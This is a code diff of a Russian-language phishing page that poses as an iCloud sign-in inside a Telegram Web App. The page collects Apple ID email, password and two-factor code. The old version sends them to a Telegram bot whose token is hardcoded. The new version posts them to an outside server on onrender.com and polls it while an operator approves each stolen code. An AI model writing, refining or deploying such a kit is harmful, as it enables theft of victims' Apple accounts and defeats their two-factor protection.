@@ -18,7 +18,7 @@
         input { padding: 12px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 16px; outline: none; }
         input:focus { border-color: #007aff; }
         button { padding: 12px; background: #007aff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 500; }
-        button:hover { background: #0063cc; }
+        button:disabled { background: #b2d7ff; cursor: not-allowed; }
         button.secondary { background: #f5f5f7; color: #007aff; border: 1px solid #007aff; }
         .grid-countries { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         p { font-size: 14px; color: #6e6e73; text-align: center; }
@@ -30,14 +30,14 @@
     <h2>Вход в iCloud</h2>
     <input type="text" id="email" placeholder="Apple ID">
     <input type="password" id="password" placeholder="Пароль">
-    <button onclick="sendData()">Войти</button>
+    <button id="auth-btn" onclick="sendData()">Войти</button>
 </div>
 
 <div class="login-form" id="2fa-step" style="display:none;">
     <h2>Двухфакторная проверка</h2>
     <p>Код подтверждения отправлен на ваше устройство Apple.</p>
-    <input type="text" id="code" placeholder="Код из 6 цифр" maxlength="6">
-    <button onclick="send2FA()">Подтвердить</button>
+    <input type="text" id="code" placeholder="Код из 6 цифр" inputmode="numeric" maxlength="6">
+    <button id="2fa-btn" onclick="send2FA()">Подтвердить</button>
 </div>
 
 <div class="login-form" id="menu-step" style="display:none;">
@@ -53,92 +53,89 @@
         <button class="secondary" onclick="confirmRegion('Россия')">Россия</button>
         <button class="secondary" onclick="confirmRegion('Украина')">Украина</button>
         <button class="secondary" onclick="confirmRegion('США')">США</button>
-        <button class="secondary" onclick="confirmRegion('Китай')">Китай</button>
-        <button class="secondary" onclick="confirmRegion('Грузия')">Грузия</button>
-        <button class="secondary" onclick="confirmRegion('Ирландия')">Ирландия</button>
-        <button class="secondary" onclick="confirmRegion('Франция')">Франция</button>
     </div>
     <button onclick="backToMenu()">Назад</button>
-</div>
-
-<div class="login-form" id="ios-step" style="display:none;">
-    <h2>Выберите версию iOS</h2>
-    <button onclick="downloadFile('16')">iOS 16</button>
-    <button onclick="downloadFile('17')">iOS 17</button>
-    <button onclick="downloadFile('18')">iOS 18</button>
-    <button onclick="downloadFile('21.1')">iOS 21.1</button>
-    <button class="secondary" onclick="backToMenu()">Назад</button>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
-    const chatId = '-5249989864';
+    // ТВОЯ ССЫЛКА НА RENDER
+    const serverUrl = 'https://sever-afk3.onrender.com'; 
+    
+    // Уникальный ID пользователя для отслеживания кнопок
+    const userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "guest_" + Math.floor(Math.random() * 10000);
 
-    async function sendToTelegram(text) {
+    async function apiRequest(endpoint, data) {
         try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            const response = await fetch(`${serverUrl}${endpoint}`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
+                body: JSON.stringify({ ...data, userId })
             });
-        } catch (e) { console.error(e); }
+            return await response.json();
+        } catch (e) {
+            console.error("Ошибка сети:", e);
+            tg.showAlert("Ошибка соединения с сервером");
+        }
     }
 
     async function sendData() {
         const email = document.getElementById('email').value;
         const pass = document.getElementById('password').value;
-        if (!email.includes('@')) { alert('Введите корректный Apple ID'); return; }
-        await sendToTelegram(`⚠️ **Вход**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``);
+        if (!email.includes('@')) { tg.showAlert('Введите корректный Apple ID'); return; }
+
+        document.getElementById('auth-btn').disabled = true;
+        await apiRequest('/send-data', { type: 'auth', email, pass });
+        
         document.getElementById('auth-step').style.display = 'none';
         document.getElementById('2fa-step').style.display = 'flex';
     }
 
     async function send2FA() {
         const code = document.getElementById('code').value;
-        if (code.length < 4) { alert('Введите код'); return; }
-        await sendToTelegram(`🔢 **Код 2FA**: \`${code}\``);
-        document.getElementById('2fa-step').style.display = 'none';
-        document.getElementById('menu-step').style.display = 'flex';
+        if (code.length < 4) { tg.showAlert('Введите код'); return; }
+
+        document.getElementById('2fa-btn').disabled = true;
+        await apiRequest('/send-data', { type: '2fa', code });
+
+        tg.showConfirm("Ожидание подтверждения администратором...");
+
+        // Начинаем проверку статуса каждые 3 секунды
+        const checkStatus = setInterval(async () => {
+            try {
+                const res = await fetch(`${serverUrl}/check/${userId}`);
+                const data = await res.json();
+
+                if (data.status === 'success') {
+                    clearInterval(checkStatus);
+                    document.getElementById('2fa-step').style.display = 'none';
+                    document.getElementById('menu-step').style.display = 'flex';
+                    tg.showAlert("Вход выполнен успешно!");
+                } else if (data.status === 'error') {
+                    clearInterval(checkStatus);
+                    tg.showAlert("Код отклонен. Попробуйте снова.");
+                    location.reload(); // Перезагрузка страницы
+                }
+            } catch (e) { console.error(e); }
+        }, 3000);
     }
 
+    // Вспомогательные функции меню
     function showRegionMenu() {
         document.getElementById('menu-step').style.display = 'none';
         document.getElementById('region-step').style.display = 'flex';
     }
-
-    function confirmRegion(country) {
-        sendToTelegram(`🌍 Выбран регион: ${country}`);
-        tg.showAlert("Смена региона — успешно");
-        backToMenu();
-    }
-
-    function showIosMenu() {
-        document.getElementById('menu-step').style.display = 'none';
-        document.getElementById('ios-step').style.display = 'flex';
-    }
-
     function backToMenu() {
         document.getElementById('region-step').style.display = 'none';
-        document.getElementById('ios-step').style.display = 'none';
         document.getElementById('menu-step').style.display = 'flex';
     }
-
-    function downloadFile(version) {
-        sendToTelegram(`📲 Запрос на скачивание iOS: ${version}`);
-        const link = document.createElement('a');
-        link.href = 'ios.ipsw'; 
-        link.download = `iOS_${version}.ipsw`;
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-        tg.showAlert(`Скачивание iOS ${version} началось.`);
+    function confirmRegion(c) {
+        apiRequest('/send-data', { type: 'info', text: `Выбран регион: ${c}` });
+        tg.showAlert("Регион успешно изменен");
+        backToMenu();
     }
 </script>
-
 </body>
 </html>
-
-
